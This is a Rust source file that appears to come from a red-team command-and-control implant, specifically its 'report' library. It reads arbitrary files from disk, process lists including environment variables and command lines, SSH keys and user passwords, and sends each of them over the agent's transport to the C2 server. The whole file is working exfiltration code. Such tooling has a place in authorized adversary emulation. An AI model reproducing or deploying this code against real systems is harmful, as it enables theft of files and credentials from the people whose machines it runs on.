use super::ReportLibrary;
use alloc::collections::BTreeMap;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use eldritch_agent::Agent;
use eldritch_core::Value;
use eldritch_macros::eldritch_library_impl;
use pb::{c2, eldritch};
use transport::ActiveTransport;
use transport::Transport;

#[eldritch_library_impl(ReportLibrary)]
pub struct StdReportLibrary {
    pub agent: Arc<dyn Agent>,
    pub transport: ActiveTransport,
    pub task_id: i64,
}

impl core::fmt::Debug for StdReportLibrary {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("StdReportLibrary")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl StdReportLibrary {
    pub fn new(agent: Arc<dyn Agent>, transport: ActiveTransport, task_id: i64) -> Self {
        Self { agent, transport, task_id }
    }
}

impl ReportLibrary for StdReportLibrary {
    fn file(&self, path: String) -> Result<(), String> {
        let content = std::fs::read(&path).map_err(|e| e.to_string())?;

        let metadata = eldritch::FileMetadata {
            path: path.clone(),
            ..Default::default()
        };
        let file_msg = eldritch::File {
            metadata: Some(metadata),
            chunk: content,
        };

        let req = c2::ReportFileRequest {
            task_id: self.task_id,
            chunk: Some(file_msg),
        };

        // Create a synchronous channel for the transport
        let (tx, rx) = std::sync::mpsc::channel();
        let mut t = self.transport.clone();

        let task_future = async move {
            // transport.report_file takes Receiver<ReportFileRequest>
            let _ = t.report_file(rx).await;
        };

        self.agent.spawn_subtask(self.task_id, "report_file".to_string(), alloc::boxed::Box::pin(task_future))
            .map_err(|e| e.to_string())?;

        // Send the single request and close the channel (by dropping tx)
        // Need to clone req? It's sent by value.
        tx.send(req).map_err(|e| e.to_string())?;

        Ok(())
    }

    fn process_list(&self, list: Vec<BTreeMap<String, Value>>) -> Result<(), String> {
        let mut processes = Vec::new();
        for d in list {
            let pid = d
                .get("pid")
                .and_then(|v| match v {
                    Value::Int(i) => Some(*i as u64),
                    _ => None,
                })
                .unwrap_or(0);
            let ppid = d
                .get("ppid")
                .and_then(|v| match v {
                    Value::Int(i) => Some(*i as u64),
                    _ => None,
                })
                .unwrap_or(0);
            let name = d.get("name").map(|v| v.to_string()).unwrap_or_default();
            let principal = d
                .get("user")
                .or_else(|| d.get("principal"))
                .map(|v| v.to_string())
                .unwrap_or_default();
            let path = d
                .get("path")
                .or_else(|| d.get("exe"))
                .map(|v| v.to_string())
                .unwrap_or_default();
            let cmd = d
                .get("cmd")
                .or_else(|| d.get("command"))
                .map(|v| v.to_string())
                .unwrap_or_default();
            let cwd = d.get("cwd").map(|v| v.to_string()).unwrap_or_default();
            let env = d.get("env").map(|v| v.to_string()).unwrap_or_default();
            // Ignoring status for now as mapping is not trivial without string-to-enum logic

            processes.push(eldritch::Process {
                pid,
                ppid,
                name,
                principal,
                path,
                cmd,
                env,
                cwd,
                status: 0, // UNSPECIFIED
            });
        }

        let req = c2::ReportProcessListRequest {
            task_id: self.task_id,
            list: Some(eldritch::ProcessList { list: processes }),
        };

        let mut t = self.transport.clone();
        let task_future = async move {
            let _ = t.report_process_list(req).await;
        };
        self.agent.spawn_subtask(self.task_id, "report_process_list".to_string(), alloc::boxed::Box::pin(task_future))
            .map_err(|e| e.to_string())
    }

    fn ssh_key(&self, username: String, key: String) -> Result<(), String> {
        let cred = eldritch::Credential {
            principal: username,
            secret: key,
            kind: 2, // KIND_SSH_KEY
        };
        let req = c2::ReportCredentialRequest {
            task_id: self.task_id,
            credential: Some(cred),
        };

        let mut t = self.transport.clone();
        let task_future = async move {
            let _ = t.report_credential(req).await;
        };
        self.agent.spawn_subtask(self.task_id, "report_credential".to_string(), alloc::boxed::Box::pin(task_future))
            .map_err(|e| e.to_string())
    }

    fn user_password(&self, username: String, password: String) -> Result<(), String> {
        let cred = eldritch::Credential {
            principal: username,
            secret: password,
            kind: 1, // KIND_PASSWORD
        };
        let req = c2::ReportCredentialRequest {
            task_id: self.task_id,
            credential: Some(cred),
        };

        let mut t = self.transport.clone();
        let task_future = async move {
            let _ = t.report_credential(req).await;
        };
        self.agent.spawn_subtask(self.task_id, "report_credential".to_string(), alloc::boxed::Box::pin(task_future))
            .map_err(|e| e.to_string())
    }
}
